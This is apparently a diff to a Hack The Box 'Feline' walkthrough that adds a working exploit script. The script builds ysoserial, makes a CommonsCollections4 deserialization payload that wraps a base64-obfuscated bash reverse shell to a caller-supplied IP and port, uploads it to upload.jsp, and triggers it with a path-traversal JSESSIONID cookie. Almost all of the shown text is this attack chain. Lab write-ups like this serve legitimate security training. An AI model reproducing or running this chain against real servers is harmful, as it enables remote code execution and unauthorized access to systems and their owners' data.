@@ -319,28 +319,44 @@ curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/execu
 
 
 ```bash 
+
+git clone https://github.com/frohoff/ysoserial.git
+
+mvn clean package -DskipTests
+
+
+cd ysoserial/target/
+
+
+vim run.sh 
+####################################################################################
+# Hackthebox "Feline" deserializtion attack 
+#####################################################################################
 #set command line paramters
 ip=$1
 port=$2
-
-#reverse shell
+#reverse shell command the trget will execute
 cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+file=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
 
-# fux it with base64
-hexout="bash -c {echo, $(echo -n $cmd | base64)} | {base64,-d} | {bash,-i}"
+# fux it with base64 to bypss bad characters
+hexout="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
 
 #create yoserial payload
-java -jar ysoserial.jar CommonsCollections4 "$hexout" > /tmp/playload.session
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 "$hexout" > /tmp/$file.session
+echo $file
 
 #upload the payload 
-curl -s -F "data=@/tmp/playload.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
+curl -s -F "data=@/tmp/$file.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
 
-#reference paylaod in cookie
-curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/playload" > /dev/null
+#reference paylaod in cookie 
+curl -s  -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$file" http://10.10.10.205:8080/ > /dev/null
 
 
+ip=x.x.x.x
+port=2424
 
-./test.sh $ip $port
+bash test.sh $ip $port
 ```
 
 ## Access extension
